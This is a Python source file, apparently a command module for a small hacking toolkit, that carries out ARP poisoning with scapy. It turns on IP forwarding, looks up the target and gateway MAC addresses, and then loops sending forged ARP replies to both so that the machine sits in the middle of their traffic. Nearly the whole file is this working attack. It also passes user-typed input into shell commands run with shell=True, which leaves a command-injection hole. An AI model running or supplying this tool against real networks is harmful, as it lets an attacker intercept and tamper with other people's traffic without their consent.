from CommandModule import *
from scapy.all import *
import subprocess
import time
import os
import _thread

class ArpSpoofing(CommandModule) :

    tgMac = ""
    tgIP = ""
    gwMac = ""
    gwIP = ""

    command = "arp"
    outline = "This command can arp poisoning"
    manual = \
"""=== <TITLE> ===
It command can arp spoof and get some data
==============="""

    def run(self) :
        tgIP    = input("Give me target IP\t: ")
        _thread.start_new_thread(arpPoisoning, ("ARP Thread", 0, tgIP))
"""
        try:
            _thread.start_new_thread(arpPoisoning)
        except:
            print ("Error: unable to start thread")
"""

def arpPoisoning(title, count, tgIP) :
    #""" # Input
#        tgMac   = input("Give me target Mac\t: ")
#        gwIP    = input("Give me gateWay IP\t: ")
#        gwMac   = input("Give me gateWay Mac\t: ")
    #"""

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    iface = "wlp4s0"

    myIP  = subprocess.check_output("ip addr | grep " + iface, shell=True).decode("utf-8").split("inet ")[1].split("/")[0]
    myMac = subprocess.check_output("ifconfig | grep " + iface, shell=True).decode("utf-8").split("HWaddr ")[1].split("\n")[0];

    subprocess.check_output("ping -c 1 " + tgIP, shell=True)

    arp_outs    = subprocess.check_output(['arp','-a']).decode("utf-8").split("\n")
    gwIP        = subprocess.check_output(['ip','route']).decode("utf-8").split("default via ")[1].split(" ")[0]

    arpTable = {}

    for arp_out in arp_outs :
        if arp_out.strip() == "" : break
        key           = arp_out.split("(")[1].split(")")[0]     # IP
        value         = arp_out.split("at ")[1].split(" ")[0]   # MAC
        arpTable[key] = value

        if key   == tgIP    : tgMac = value
        elif key == gwIP    : gwMac = value

    while True :
        try :
            sendp( Ether(dst=tgMac,src=myMac)/ARP(hwsrc=myMac, psrc=gwIP, pdst=tgIP), verbose=False )
            sendp( Ether(dst=gwMac,src=myMac)/ARP(hwsrc=myMac, psrc=tgIP, pdst=gwIP), verbose=False )
            time.sleep(1)
        except KeyboardInterrupt :
            # print("Bye")
            break

if __name__ == '__main__':
    a = ArpSpoofing()
    a.run();
